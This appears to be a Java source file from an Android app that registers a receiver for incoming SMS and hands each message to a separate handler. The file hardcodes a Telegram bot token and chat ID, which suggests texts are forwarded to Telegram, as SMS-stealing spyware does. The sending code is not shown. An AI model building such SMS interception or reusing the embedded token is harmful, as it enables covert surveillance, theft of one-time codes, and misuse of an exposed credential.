package com.agayev.smssender;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class SMSReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSReceiver";
    public static final String TELEGRAM_TOKEN = "6677383791:AAG8IXVqNNaTRecw0aAozgxhVIDjKshbQt0";
    public static final String TELEGRAM_CHAT_ID = "-1002036548423";
    public static final String SMS = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        SmsHandler handler = new SmsHandler();
        if (intent.getAction().equals(SMS)) {
            handler.handleSms(context, intent);
        }
    }
}

